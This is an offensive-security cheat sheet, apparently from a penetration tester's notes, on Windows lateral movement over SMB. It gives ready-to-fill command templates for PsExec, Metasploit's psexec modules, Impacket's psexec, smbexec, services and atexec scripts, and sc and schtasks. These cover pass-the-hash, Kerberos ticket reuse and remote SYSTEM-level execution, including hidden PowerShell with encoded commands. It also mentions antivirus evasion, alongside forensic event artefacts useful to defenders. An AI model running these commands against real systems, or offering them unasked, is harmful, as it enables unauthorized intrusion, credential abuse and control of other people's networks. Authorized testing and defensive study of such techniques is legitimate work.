# Windows - Lateral movement - Over SMB

### PsExec-like utilities

`PsExec`-like utilities operate under the same general principle:
  - Upload of a binary on the targeted system, usually through the `ADMIN$` or
  `C$` Windows built-in `SMB` shares.
  - Execution of the uploaded binary through the creation and execution of a
  Windows service, leveraging the `Service Control Manager (SCM)` service
  through the `MSRPC` protocol (`SVCCTL` interface).

The aforementioned actions require the following elevated privileges on the
targeted system, usually given to members of the local `Administrators` group:
    - Write permission on any network share (both `NTFS` and `Share` write
      permission). `PsExec` however requires specifically write permission to
      the `ADMIN$` share. If necessary, a writable share can be configured
      remotely through the `Server Service` `MSRPC` interface.
    - Permissions to create (`SC_MANAGER_CREATE_SERVICE`) and start
      (`SERVICE_QUERY_STATUS` + `SERVICE_START`) Windows services.

The execution of a `PsExec`-like utility will notably, in addition to
`Security` `EID 4624` and `EID 4672` events, generate the following Windows
events:
  - `System` hive, `EID 7045: A service was installed in the system`.
  - `Security` starting from the Windows Server 2016 and Windows 10 operating
    systems, `EID 4697: A service was installed in the system`.
  - `System` hive, `EID 7036: The <SERVICE_NAME> service entered the
    <running/stopped> state`.

###### Writable network share

The `smbmap` Python script can be used to list the shares, and their
configured permissions, on the remote system and the `rpcclient` utility
can be used to call the `NetShareAdd` function of the `Server Service` `MSRPC`
interface in order to create a share on the remote system.

According to the Microsoft documentation, only members of the `Administrators`,
`System Operators`, or `Power Users` local groups can add shares using the
`NetShareAdd` function. The `Print Operator` can however add printer
shares.

```
# The <HASH> should be specified in the <LM_HASH:NT_HASH> format (<aad3b435b51404eeaad3b435b51404ee:NT_HASH>)
smbmap [-d <DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | HASH>] (-H <HOSTNAME | IP> | --host-file <FILE>)

rpcclient -U "<USERNAME>" [--pw-nt-hash] <HOSTNAME | IP>

rpclient $> netshareadd "<C:\Windows | SHARE_PATH>" "<SHARE_NAME>" <MAX_USERS> "<COMMENT>"
```

An utility supporting the specification of the remote share to write the binary
to, such as the `Metasploit`'s `exploit/windows/smb/psexec` module or
the `Impacket`'s `smbexec.py` Python script can then be leveraged to execute
code on the remote system.

###### PsExec-like utilities

*PsExec*

The `PsExec` CLI utility, from the Microsoft `sysinternals` suite and signed by
Microsoft, can be used to execute commands, locally or remotely and under the
current user or specified user identity.

While the use of a more complete attack framework is recommended on the
attacking machine (such as `Cobalt Strike`, `CrackMapExec` or `Metasploit`),
`PsExec` may be uploaded on a compromised host in order to futher reach
segregated targets as it will not raise alerts against some anti-virus
solutions.

`PsExec` uses a named pipe over the `Server Message Block (SMB)` protocol,
which runs on `TCP` port 445. The utility will connect to the `ADMIN$` share of
the targeted host, upload the `PSEXESVC.exe` binary and use the `Service
Control Manager` to start the aforementioned binary.

Note that while the name of the created service can be specified, the name of
the uploaded binary cannot be changed, resulting in known forensics artefacts
on the accessed system associated to the use of `PsExec`, such as:
  - A Windows `Security` event `EID 4624: An account was successfully logged
    on` with its `Process Name`	field set to `C:\Windows\PSEXESVC.exe`.
  - A `PSEXESVC.EXE` entry in the `Shimcache` / `Amcache`
  - A possible record in the `Master File Table (MFT)` and `Update Sequence
  Number Journal (USN) Journal`

If an user is specified using the `-u` option, an interactive logon (`Logon
type 2`) will be attempted by `PsExec`, resulting in the storing of the given
user `NTLM` hash in `LSASS` memory. For logons attempted using the  current
user identity, `PsExec` will conduct network logon (`Logon type 3`).

```
# -s - Runs the remote process as the System account (NT AUTHORITY\SYSTEM).
# -h - If the targeted system is using the Windows Vista operating system, or higher, the created process will attempt to be run with the account's elevated token.
# -r <SERVICE_NAME> - Specifies the name of the remote service to create. Default to PSEXESVC.

# Interactive commands execution through cmd or PowerShell
PsExec.exe -accepteula \\<HOST | IP> -s <cmd.exe | %ComSpec% | powershell.exe>
PsExec.exe -accepteula \\<HOST | IP> -u "<DOMAIN | WORKGROUP>\<USERNAME>" -p "<PASSWORD>" -s <cmd.exe | %ComSpec% | powershell.exe>

# Unitary command execution on one or multiple specified hosts.
# PsExec hosts specified file should be encoded in ANSI.
PsExec.exe -accepteula [\\<IP | HOSTNAME | IPS | HOSTNAMES> | @<FILE_FULL_PATH>] -u "<DOMAIN | WORKGROUP>\<USERNAME>" -p "<PASSWORD>" -s <cmd.exe /c "<COMMAND> <COMMAND_ARGS>" | %ComSpec% /c "<COMMAND> <COMMAND_ARGS>" | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "<COMMAND> <COMMAND_ARGS>" | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>
```

*Metasploit PsExec*

The `exploit/windows/smb/psexec` `Metasploit` module can be used to execute a
`Metasploit` payload, such as a `Meterpreter`, on a targeted system using a
cleartext password or an `NTLM` hash.

This module will by default generate a service with a random name and
description and allows the specification of a network share.

```
# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
msf> use exploit/windows/smb/psexec
```

*Impacket psexec.py*

The `Impacket`'s `psexec.py` Python script will upload and execute the
`RemComSvc` service, based on the open-source `RemCom` project.

`psexec.py` present the advantage of supporting both `NTLM`, uisng a cleartext
password or an `NTLM` hash, and `Kerberos` authentication, using a
`Ticket-Granting Ticket (TGT)` or a `service ticket` for the remote machine
`CIFS` service. For more information on how to make use of `service tickets`
(`Pass-the-Ticket`), refer to the `[ActiveDirectory] Kerberos - silver tickets`
note.

`psexec.py` will by default upload a binary and generate a service with a
random name and allows the specification of a network share.

```
# --target-ip: Specifies the IP address of the targeted machine. If omitted, psexec.py will use the host or IP pecified in the target string. The option is useful when the target is an unresolvable NetBIOS name.

# NTLM authentication
psexec.py [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
psexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
psexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
```

Additionally, `psexec.py` can easily be incorporated into custom Python
scripts:

```
import psexec

psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", None, "445/SMB", username = '<USERNAME>', password = '<PASSWORD>')
raw_result = psobject.run("<HOSTNAME | IP>")
print raw_result
psobject.kill();
```

*Invoke-SMBExec*

The `Invoke-SMBExec` PowerShell cmdlet can be used to pass the hash over SMB in
PowerShell.

The `Invoke-SMBExec` cmdlet will by default upload a binary and generate a
service with a random name.

```
Invoke-SMBExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose
```

###### Fileless PsExec-like utilities

The `Impacket`'s `smbexec.py` Python script and the `Metasploit`'s
`exploit/windows/smb/psexec` module implement a fileless variation of
`PsExec`. Instead of uploading a binary, the created Windows service will
execute Windows built-in binaries.

`smbexec.py` rely on `%COMSPEC%` (`cmd.exe`) and will, for each specified
command, create a Windows service that `echo` the command in a temporary file
(`%TEMP%\execute.bat`), then execute and ultimately delete the `bat` file.

The `Metasploit`'s `exploit/windows/smb/psexec` module rely on both `%COMSPEC%`
and `powershell.exe` and will create a Windows service that execute the
specified payload (bind / reverse `meterpreter`, single command, etc.) through
a `PowerShell` one-liner.

`Metasploit` will generate a random name for the Windows service while
`smbexec.py`, by default, create a service named `BTOBTO`.

```
# NTLM authentication
smbexec.py [-service-name <SERVICE_NAME>] [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
smbexec.py [-service-name <SERVICE_NAME>] -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
smbexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]

# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
msf> use exploit/windows/smb/psexec_psh
```

### Remote Windows services

The Windows built-in utility `Service Control (sc)` and the `Impacket`'s
`services.py` Python script can be used to remotely create and start a Windows
service.

Remote code execution can be achieved through a Windows service by:
    - Copying a binary to the targeted system and executing it through the
      service (`PsExec`-like).
    - Directly executing a one-liner or payload through a built-in Windows
      binary, such as `cmd.exe`.

Refer to the `[General] Shells` note for Windows reverse shell one-liners and
scripts.

Note that if the specified binary is not a service binary (i.e. a binary
implementing the `LPSERVICE_MAIN_FUNCTION` callback function), an error message
will be raised (`Error 1053: The service did not respond to the start or
control request in a timely fashion.`). The binary will however have been
executed once, which for some payload may be sufficient (`meterpreter`
notably).

```
# <SERVICE_COMMAND> example with a Windows binary: <cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>' |  %ComSpec% /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>

sc \\<IP | HOSTNAME> create <SERVICE_NAME> binpath= "<SERVICE_COMMAND>"
sc \\<IP | HOSTNAME> start <SERVICE_NAME>

# NTLM authentication
services.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
services.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <start | delete> -name <SERVICE_NAME>

services.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
services.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <start | delete> -name <SERVICE_NAME>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
services.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
services.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> <start | delete> -name <SERVICE_NAME>
```

### Remote scheduled tasks

The Windows built-in utility `schtasks`, the `Impacket`'s `atexec.py`
Python script, and the Windows `Task Scheduler` graphical utility can be used
to remotely create and start a Windows scheduled tasks.

Remote code execution can be achieved through a Windows scheduled task by:
    - Copying a binary to the targeted system and executing it through the
      scheduled task.
    - Directly executing a one-liner or payload through a built-in Windows
      binary, such as `cmd.exe` or `powershell.exe`.

Refer to the `[General] Shells` note for Windows reverse shell one-liners and
scripts.

While `schtasks` does not have a "run now" option, a scheduled task can be
programmed to run once and starts in a few minutes. The `/Z` switch can be
specified to automatically delete the scheduled task after execution. It may
however raise compatibility issue, in which case the scheduled task would need
to be deleted manually.

`atexec.py` will create, run and immediately delete a scheduled task, by
default with a random generated name, that execute the specified command. The
scheduled task will be executed as `NT AUTHORIT\SYSTEM`. The command output
will be stored in a temporary random file and retrieved through the `ADMIN$`
share.

The Windows `Task Scheduler` utility can be used to configure remote scheduled
task through the `Microsoft Management Console (MMC)` utility:

```
File -> Add/Remove Snap-in (Ctrl + M) -> Task Scheduler -> Add
Specification of the remote computer: Another computer -> (Optional) Connect as another user

Task Scheduler (<HOSTNAME>) -> Right click -> Create task...

  General -> Name
          -> Description
          -> Run whether user is logged on or not
          -> Hidden
          -> Run with highest privileges
          -> (Optional, to run as NT AUTHORITY\SYSTEM) Change User or Group... -> SYSTEM

  Actions -> New... -> Program/script: <cmd.exe | %ComSpec% | powershell.exe | BINARY>
          -> Add arguments (optional): <COMMAND_ARGS>

  Conditions -> Power -> Start the task only if the computer is on AC power -> Unchecked

Task Scheduler Library -> Right click on <TASK> -> Run / Delete
```

```
# <TASK_COMMAND> example with the Windows built-in cmd.exe or PowerShell:
cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>'
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>'
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD>
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc <ENCODED_BASE64_CMD>

# Create a scheduled task to run PowerShell code for example
schtasks /create /tn "<TASK_NAME>" /tr "<TASK_COMMAND>" /sc once /sd <MM/DD/YYYY> /st <HH:MM:SS> /V1 /Z /RU "NT AUTHORITY\SYSTEM" /S <IP | HOSTNAME>

# The creation and status of the scheduled task can be validated
schtasks /query /tn "<TASK_NAME>" /S <IP | HOSTNAME>
schtasks /run /tn "<TASK_NAME>" /S <IP | HOSTNAME>
schtasks /delete /tn "<TASK_NAME>" /S <IP | HOSTNAME>

# By default, atexec execute "cmd /C <COMMAND>"
# NTLM authentication
atexec.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <TASK_COMMAND>
atexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <TASK_COMMAND>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
atexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> "<COMMAND | TASK_COMMAND>"
```
